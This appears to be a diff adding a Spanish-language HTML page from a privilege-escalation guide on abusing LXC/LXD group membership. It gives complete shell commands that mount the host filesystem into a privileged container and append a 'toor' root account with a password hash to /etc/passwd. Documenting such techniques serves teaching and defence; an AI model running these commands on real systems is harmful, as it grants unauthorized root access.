@@ -1,0 +1,34 @@
+<h1>Grupo LXC/LXD</h1>
+
+<h2><i class="bi bi-check-circle me-2"></i></i>Explicación</h2>
+<p class="mainText">
+    El grupo <b>LXC/LXD</b> controla el acceso y la gestión de los contenedores y el demonio de los contenedores, respectivamente. Se trata de un sistema 
+    de virtualización similar a Docker, diseñado para proporcionar un entorno ligero y aislado para la ejecución de aplicaciones y servicios. 
+</p>
+
+<h2><i class="bi bi-check-circle me-2"></i></i>Ataque</h2>
+<p class="mainText">
+    Al igual que sucede con Docker, un atacante podría crear un contenedor donde se pueda montar todo el sistema de archivos del host original. Luego, podría 
+    acceder al sistema de archivos original con permisos de root para elevar privilegios, por ejemplo, creando un usuario root en el archivo passwd.
+</p>
+<p class="mainText">
+    Una técnica común para la elevación de privilegios será utilizando el siguiente contenedor <b>alpine-v3.13-x86_64-20210218_0139.tar.gz</b>
+    <a class="linksref" target="_blank" href="https://github.com/saghul/lxd-alpine-builder/blob/master/alpine-v3.13-x86_64-20210218_0139.tar.gz">
+        <i class="bi bi-box-arrow-up-right"></i>
+    </a>
+
+</p>
+<!-- Code snipet-->
+<div class="snipet_custom position-relative">
+<pre class="code_snipet"><code data-language="shell">#Importamos la imagen
+lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
+lxc init myimage mycontainer -c security.privileged=true
+lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+lxc start mycontainer
+#Ejecutamos una shell en el container
+lxc exec mycontainer /bin/sh 
+#Añadimos el nuevo root en passwd
+echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/root/etc/passwd
+</code></pre>
+</div>
+
